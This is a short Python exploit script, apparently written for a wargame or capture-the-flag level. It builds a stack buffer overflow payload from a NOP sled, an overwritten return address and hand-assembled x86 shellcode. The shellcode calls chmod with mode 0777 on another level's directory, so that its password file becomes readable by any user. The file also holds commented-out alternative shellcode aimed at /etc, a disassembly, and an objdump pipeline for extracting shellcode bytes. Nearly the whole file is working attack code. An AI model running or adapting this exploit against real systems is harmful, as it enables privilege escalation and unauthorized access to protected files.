import struct
import sys

ADDR_GETS = 0xffffddc0


# we ll use an other one to chmod the password file to all users so we can read it with lv4

# payload="
# \x89\xc3\x31\xd8\x50\xbe\x3e\x1f
# \x3a\x56\x81\xc6\x23\x45\x35\x21
# \x89\x74\x24\xfc\xc7\x44\x24\xf8
# \x2f\x2f\x73\x68\xc7\x44\x24\xf4
# \x2f\x65\x74\x63\x83\xec\x0c\x89
# \xe3\x66\x68\xff\x01\x66\x59\xb0
# \x0f\xcd\x80
# "


filename="//home//users//level05//"

parts=[filename[i:i+4] for i in range(0, len(filename), 4)]

parts_encoded = ''.join([f"\x68{part}" for part in parts[::-1]]).encode("ascii")

payload=b"\x31\xc0\x31\xdb\x31\xc9\x81\xe4\x01\xf0\xff\xff"+parts_encoded+b"\x89\xe3\x66\xb9\xff\x01\xb0\x0f\xcd\x80\x31\xc0\x31\xdb\xfe\xc0\xcd\x80"
#60 len



#\x31\xc0\x31\xdb\x31\xc9\x81\xe4\x01\xf0\xff\xff\x68\x2f\x61\x62\x63\x68\x2f\x74\x6d\x70\x89\xe3\x66\xb9\xff\x01\xb0\x0f\xcd\x80\x31\xc0\x31\xdb\xfe\xc0\xcd\x80
#

exploit=b"\x90"*156
exploit+=b"\x3c\xd8\xff\xff"
exploit+=b"\x90"*500
exploit+=payload
sys.stdout.buffer.write(exploit)

# 00000000 <main>:
#    0:	31 c0                	xor    eax,eax
#    2:	31 db                	xor    ebx,ebx
#    4:	31 c9                	xor    ecx,ecx
#    6:	83 ec 0c             	sub    esp,0xc
#    9:	68 f2 47 d6 07       	push   0x7d647f2
#    e:	68 f2 16 26 36       	push   0x362616f2
#   13:	89 e3                	mov    ebx,esp
#   15:	66 b9 b6 01          	mov    cx,0x1b6
#   19:	b0 0f                	mov    al,0xf
#   1b:	cd 80                	int    0x80
#   1d:	31 c0                	xor    eax,eax
#   1f:	31 db                	xor    ebx,ebx
#   21:	fe c0                	inc    al
#   23:	cd 80                	int    0x80
#
# objdump -D hello_tuto.o |  grep "^ " | cut -f2 | tr -d ' ' \
#                 | sed 's/.\{2\}/\\x&/g' | tr -d '\n'; echo
